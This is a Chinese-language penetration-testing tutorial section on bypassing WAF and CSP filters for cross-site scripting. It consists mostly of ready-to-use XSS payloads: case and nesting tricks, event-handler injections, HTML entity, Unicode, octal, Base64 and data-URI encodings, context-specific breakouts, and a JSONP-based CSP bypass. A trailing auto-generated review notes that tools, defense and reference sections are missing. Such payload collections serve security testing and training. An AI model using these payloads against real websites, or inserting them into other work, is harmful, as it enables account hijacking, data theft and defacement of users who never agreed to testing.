# XSS绕过技术

### 3.1 标签变形

通过HTML标签变形绕过WAF的XSS规则匹配：

```html
<!-- 原始Payload -->
<script>alert(1)</script>

<!-- 大小写变形 -->
<ScRiPt>alert(1)</ScRiPt>

<!-- 嵌套标签 -->
<scr<script>ipt>alert(1)</scr</script>ipt>

<!-- 空格/换行插入 -->
<script/x>alert(1)</script>
<script%0a>alert(1)</script%0a>

<!-- 编码实体 -->
<script>&#97;lert(1)</script>

<!-- 标签属性插入 -->
<script type="text/javascript">alert(1)</script>
<script data="x">alert(1)</script>
```

### 3.2 事件绕过

利用HTML事件处理器替代`<script>`标签：

```html
<!-- 常见事件处理器 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>

<!-- 冷门事件 -->
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video oncanplay=alert(1) src=x>
<svg onanimationstart=alert(1)>

<!-- 事件名变形 -->
<img src=x ONERROR=alert(1)>
<img src=x OnErRoR=alert(1)>

<!-- 事件处理器编码 -->
<img src=x onerror=&#97;lert(1)>
```

### 3.3 编码绕过

#### 3.3.1 HTML实体编码

```html
<!-- 十进制HTML实体 -->
<img src=x onerror=alert(&#49;)>

<!-- 十六进制HTML实体 -->
<img src=x onerror=alert(&#x31;)>

<!-- 无分号实体（部分浏览器支持） -->
<img src=x onerror=alert(&#49)>

<!-- 实体编码标签名 -->
&#60;script&#62;alert(1)&#60;/script&#62;
```

#### 3.3.2 JavaScript编码

```html
<!-- Unicode编码 -->
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>

<!-- 八进制 -->
<img src=x onerror=\141\154\145\162\164(1)>

<!-- 十六进制 -->
<img src=x onerror=\x61\x6c\x65\x72\x74(1)>

<!-- 混合编码 -->
<img src=x onerror=\u0061lert(1)>
```

#### 3.3.3 Data URI

```html
<!-- Data URI执行JavaScript -->
<iframe src="data:text/html,<script>alert(1)</script>">
<object data="data:text/html,<script>alert(1)</script>">
<embed src="data:text/html,<script>alert(1)</script>">
```

#### 3.3.4 Base64编码

```html
<!-- Base64编码Payload -->
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<!-- atob('YWxlcnQoMSk=') = alert(1) -->

<!-- 结合Data URI -->
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

### 3.4 Content-Type绕过

```
Content-Type绕过场景:
├── JSON API中的XSS
│   ├── 修改Content-Type为text/html
│   └── 利用API返回错误页面渲染HTML
│
├── XML中的XSS
│   ├── 利用XHTML渲染
│   └── XML实体注入配合XSS
│
├── 多部分表单中的XSS
│   └── 在文件名/Content-Disposition中注入
│
└── 响应头注入
    ├── HTTP响应拆分 → 注入Content-Type: text/html
    └── 利用CRLF注入修改响应头
```

### 3.5 上下文相关绕过

根据XSS注入点的上下文，采用不同的绕过策略：

```html
<!-- 上下文1: HTML标签属性中 -->
<input value="INPUT_HERE">
→ " onfocus=alert(1) autofocus="
→ " onmouseover=alert(1) //"

<!-- 上下文2: JavaScript字符串中 -->
<script>var x = 'INPUT_HERE';</script>
→ ';alert(1);//
→ '</script><script>alert(1)</script>

<!-- 上下文3: JavaScript代码块中 -->
<script>INPUT_HERE</script>
→ alert(1)//

<!-- 上下文4: URL参数中 -->
<a href="INPUT_HERE">link</a>
→ javascript:alert(1)
→ data:text/html,<script>alert(1)</script>
```

### 3.6 CSP绕过

当目标部署了内容安全策略（CSP）时，可尝试以下绕过方式：

```
CSP绕过方法:
├── 利用CSP白名单中的可信域
│   ├── 如果白名单含cdn → 利用CDN上的JS库
│   └── 如果白名单含google → 利用Google Analytics的回调
│
├── 利用JSONP端点
│   ├── 找到白名单域的JSONP接口
│   └── 通过callback参数执行代码
│
├── 利用base标签
│   ├── 如果CSP未限制base-uri
│   └── 修改JS加载基路径
│
├── 利用unsafe-inline/unsafe-eval
│   ├── unsafe-inline → 直接执行内联脚本
│   └── unsafe-eval → 使用eval/Function执行
│
└── 利用DNS预解析
    └── 通过DNS prefetch泄露数据
```

```html
<!-- JSONP绕过CSP示例 -->
<!-- 如果CSP白名单含trusted.com -->
<script src="https://trusted.com/api/jsonp?callback=alert(1)"></script>
<!-- trusted.com返回: alert(1);{"data":"..."} -->
```

---

---

## 📋 内容审核与补充建议

> 针对「XSS绕过技术」部分的内容审核结果：

### 🔧 工具推荐
- ⚠️ 缺少tools相关内容

### 📚 知识点补充
- ⚠️ 缺少knowledge相关内容

### 🎯 实战练习
- ⚠️ 缺少practice相关内容

### 🛡️ 防御方案
- ⚠️ 缺少defense相关内容

### 📖 参考资料
- ⚠️ 缺少参考资料/延伸阅读

---

## 📌 拓展学习资源

### 推荐学习路径
- 理论基础 → 工具实践 → 实战演练 → 深度研究
- 建议搭建本地实验环境进行动手练习

### 相关工具与资源
- 在线实验平台：Hack The Box、TryHackMe、VulnHub
- 技术文档：官方文档、RFC、OWASP 指南
- 社区资源：GitHub、安全论坛、技术博客
